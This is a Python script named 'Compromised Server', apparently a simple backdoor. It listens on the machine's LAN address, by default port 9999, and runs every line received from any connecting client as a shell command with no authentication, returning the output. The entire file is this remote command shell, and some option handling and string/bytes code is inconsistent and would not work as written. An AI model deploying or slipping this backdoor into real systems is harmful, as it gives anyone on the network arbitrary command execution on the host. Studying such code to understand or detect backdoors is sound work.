import sys
import socket
import os
import getopt
import threading
import subprocess
import fcntl
import struct

if os.name != "nt":
    def get_interface_ip(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s',
                                                                            ifname[:15]))[20:24])


def get_lan_ip():
    ip = socket.gethostbyname(socket.gethostname())
    if ip.startswith("127.") and os.name != "nt":
        interfaces = [
            # Comment out interfaces you do not want to listen on,
            # or add an interface you want to listen on
            # "eth0",
            # "eth1",
            # "eth2",
            "wlan0",
            # "wlan1",
            # "wifi0",
            # "ath0",
            # "ath1",
            # "ppp0",
        ]
        for interface_name in interfaces:
            try:
                ip = get_interface_ip(interface_name)
                break
            except IOError:
                pass
    print(ip)
    return ip


execute_command = ""
target_IPA = get_lan_ip()
target_port = 9999


def usage():
    print("Compromised Server")
    print()
    print("Usage: CompromisedServer.py -l ip address -p port")
    print("No arguments: "
          "and the server will listen on the ipaddress assigned at wlan0 on port 9999")
    print("-l may be used to specify the IP address you wish to listen on")
    print("-d may be used to specify the port to use")
    print()
    print("Examples: ")
    print("-l 192.168.0.4 -p 9999")
    sys.exit(0)


def server_loop():
    global target_IPA
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target_IPA, target_port))
    server.listen(1)
    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(command):
    command = command.rstrip()
    print("Executing: " + command)
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    return output


def client_handler(client_socket):
    global execute_command
    # check for command execution
    if len(execute_command):
        output = run_command(execute_command)  # run the command
        client_socket.send(output)
        # we go into a loop to provide the command shell

    # show a simple prompt so we know were through
    client_socket.send("Begin Executing On Server")
    while True:
        cmd_buffer = ""
        while "\n" not in cmd_buffer:
            # pick up all text as a command
            cmd_buffer += client_socket.recv(1024)
            # make sure we are not just catching a newline
        if not cmd_buffer.__eq__("\n"):
            response = run_command(cmd_buffer)
            # send back the results of the command
            client_socket.send(response)


def main():
    global target_port
    global execute_command
    global target_IPA
    # Parse the arguments the script was ran with
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "target", "port"])
    except getopt.GetoptError as err:
        print (str(err))
        usage()
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-p", "--port"):
            target_port = int(a)
        elif o in ("-l", "--listen"):
            target_IPA = a
        else:
            assert False, "Unhandled Option"
            usage()
    server_loop()


main()
